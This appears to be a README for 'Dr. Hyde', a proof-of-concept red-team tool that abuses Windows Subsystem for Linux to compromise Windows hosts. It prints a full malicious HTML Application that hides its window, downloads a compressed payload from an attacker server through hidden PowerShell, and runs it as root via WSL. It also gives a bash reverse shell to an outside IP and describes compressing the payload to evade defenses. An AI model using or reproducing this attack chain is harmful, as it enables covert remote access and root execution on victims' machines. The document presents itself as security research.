


Windows Subsystem for Linux 2 (WSL) allows developers to run GNU/Linux applications on a lightweight virtualized Linux kernel, which interfaces with the Windows kernel, hence the "Subsystem". While this has been a powerfull efficiency tool for red team engagements and penetration tests, it presents some glaring security issues for the system itself.

Starting in build 22H2 of Windows 10 and 11, the `wsl` PowerShell command allows users to call Linux commands and programs by prefacing them with the `wsl`. For example:

![Pasted image 20230206162823](https://github.com/TheTyPhyter/DrHyde/assets/45110834/007ea9e0-0c7b-43be-8f82-ea012c6ee373)


Interestingly when working from within the Linux kernel, Windows commands can also be called:


![Pasted image 20230206163615](https://github.com/TheTyPhyter/DrHyde/assets/45110834/6929abf8-4367-466c-8cba-0aba89f139ef)

The above screenshots demonstrate the ability to call commands between the kernels, which is the intended function of the feature. Unfortunately, I beleive this creates an insecure system, allowing attackers to hide malicous bash scripts and linux binaries. The Linux Kernal also has access to most of the Windows file system, including write privilege to the user startup folder and other sensitive directories. WSL also comes with the ability to run commands as `root` without authentication. 


# The Attack

By combining Linux and Windows commands, it becomes possible to develope a unique attack chain. 

## Setup

A web server hosts a malicious .hta (HTML Application, see below) which allows us to execute Javascript on the target machine.
```
<html>  
<head>  
<script language="JScript">  
  
function sleep(milliseconds) {  
        timeStart = new Date().getTime();  
        while (true) {  
            elapsedTime = new Date().getTime() - timeStart;  
            if (elapsedTime > milliseconds) {  
                break;  
            }  
        }  
    }  
   
window.moveTo(-1, -1);  
window.blur();  
window.resizeTo(0, 0);  
WshShell = new ActiveXObject("WScript.Shell");  
outFile = " $home/2.gz";  
line1 = "%comspec% /k powershell.exe -WindowStyle hidden Invoke-Webrequest http:\/\/192.168.1.197:8000/1.gz -outfile";  
line2 = "%comspec% /k powershell.exe -WindowStyle hidden wsl -u root gzip -d /mnt/c/Users/$env:UserName/2.gz";  
line3 = "%comspec% /k powershell.exe -WindowStyle hidden wsl -u root bash /mnt/c/Users/$env:UserName/2";  
WshShell.Run(line1 + outFile);  
sleep(1000);  
WshShell.Run(line2);  
sleep(5000);  
WshShell.Run(line3);  
</script>  

<hta:application  
caption="no"  
windowState="minimize"  
showInTaskBar="no"  
scroll="no"  
navigable="no" />            <!--  -->  
</head>  
<body>  
</body>  
</html>
```


- We also host a bash script that has been compressed into a .gz in an effort to evade perimeter defense. This bash script sets up a reverse TCP connection to the attack box by redirecting stdin and stdout to the tcp connection.

```
#! /bin/bash
sh -i >& /dev/tcp/45.79.112.50/4445 0>&1
```


# Dr. Hyde

Dr. Hyde is a proof of concept tool that that starts a simple Python HTTP server to host our payloads. It also starts a simple tcp listener to catch a non-interactive shell. Once the reverse shell is established, it becomes possible to run both bash and PowerShell commands.

We enter the command `mshta <URL to Malicious .hta>`

- The JavaScript in the .hta calls the %comspec% variable (which is the directory where the default command interpreter, CMD, lives) which in turn calls powershell to download the compressed bash script from our malicous webserver.
- The next command calls wsl as root to decompress the file and save the output to the users home directory.
- The last command executes the bash script as root establishing the connection back to the listener on the attack box.

After the attack chain is complete, the remote attacker is left with a non-interactive shell as the user "root" on the Linux shell, and the victim user in the Windows PowerShell.

After persistence is established, standard methods of gaining an interactive shell can be employed, and having access to GNU/Linux toolsets improves conditions for the attacker. 

## Demo





https://github.com/TheTyPhyter/DrHyde/assets/45110834/d634a706-9f82-4350-a1de-c2aa64073fc0

